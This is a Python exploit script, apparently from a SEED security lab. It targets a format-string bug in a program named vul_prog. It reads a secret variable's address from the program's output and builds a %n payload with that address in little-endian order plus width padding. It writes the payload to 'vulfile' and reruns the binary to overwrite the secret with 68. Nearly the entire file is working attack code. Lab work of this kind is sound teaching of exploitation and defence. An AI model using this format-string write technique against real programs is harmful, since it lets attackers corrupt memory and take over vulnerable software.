import os
import subprocess
import re


# Define the binary and other constants
binary = "/home/seed/Desktop/lab8/play/vul_prog"

import re

def get_secret_address(binary):
    """
    Run the binary and extract the secret variable's address.
    """
    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()

    # Decode the output and debug print
    print("Program output for debugging:")
    decoded_output = output.decode('latin-1')
    print(decoded_output)  # Full raw output for debugging

    # Debug: Explicitly show whether the regex matches the expected address
    match = re.search(r"0x[0-9a-fA-F]+", decoded_output)
    if match:
        print("Matched address: {}".format(match.group(0)))  # Debug matched address
        return match.group(0)  # Return the first matched address
    else:
        print("Regex did not match any address.")
        print("Decoded output inspected:\n{}".format(decoded_output))

    return None






def craft_payload(secret_addr, target_value):
    """
    Craft the payload based on the secret address and target value.
    """
    # Convert the secret address to little-endian format
    addr = bytearray.fromhex(secret_addr[2:])
    addr.reverse()
    addr = addr.decode('latin-1')

    # Calculate the padding needed to write the target value
    num_chars = target_value
    if num_chars > len(addr):
        padding = "%%%dx" % num_chars
    else:
        padding = ""
    
    payload = addr + " " + padding + " %n"
    return payload

def run_exploit(binary, payload):
    """
    Execute the binary with the crafted payload.
    """
    print("Writing payload to vulfile...")
    with open("vulfile", "wb") as f:
        f.write(payload.encode())
    print("Payload written: {}".format(payload))  # Debug: confirm payload written
    
    print("Executing program with crafted payload...")
    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    print("Program output after exploit:")
    print(output.decode('latin-1'))  # Debug: print program output
    return output.decode('latin-1')


# Get the secret variable's address
secret_addr = get_secret_address(binary)
if not secret_addr:
    print("Failed to retrieve secret variable's address.")
    exit(1)

print("Secret variable's address: %s" % secret_addr)

# Target value for the secret variable
target_value = 68

# Craft the payload
payload = craft_payload(secret_addr, target_value)
print("Crafted payload: %s" % payload)

# Run the exploit
output = run_exploit(binary, payload)
print("Program output:")
print(output)
